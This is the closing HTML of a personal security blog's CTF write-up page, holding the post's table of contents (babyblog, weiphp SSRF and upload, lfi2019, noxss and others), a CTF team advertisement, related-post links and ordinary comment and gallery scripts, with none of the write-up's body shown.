<a href=/tags/CTF/>CTF</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2022/02/21/2022-02-21-PracticalTimingTimeless/>
<div class=article-details>
<h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timing Timeless in Browser</h2>
</div>
</a>
</article>
<article>
<a href=/2022/01/08/2022-01-08-TheEndOfLFI/>
<div class=article-details>
<h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2>
</div>
</a>
</article>
<article>
<a href=/2021/12/27/2021-12-20-ANewNovelLFI/>
<div class=article-details>
<h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2>
</div>
</a>
</article>
<article>
<a href=/2021/08/02/cybrics-checkin-2021/>
<div class=article-details>
<h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2>
</div>
</a>
</article>
<article>
<a href=/2021/07/21/google-qual-2021/>
<div class=article-details>
<h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2022 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#babyblog>babyblog</a></li>
<li><a href=#babypress>babypress</a></li>
<li><a href=#weiphp>weiphp</a>
<ol>
<li><a href=#ssrf>SSRF</a></li>
<li><a href=#upload>upload</a></li>
</ol>
</li>
<li><a href=#lfi2019>lfi2019</a>
<ol>
<li><a href=#trick-1>Trick 1</a></li>
<li><a href=#trick-2>Trick 2</a></li>
</ol>
</li>
<li><a href=#noxss>noxss</a></li>
<li><a href=#tfboys>tfboys</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>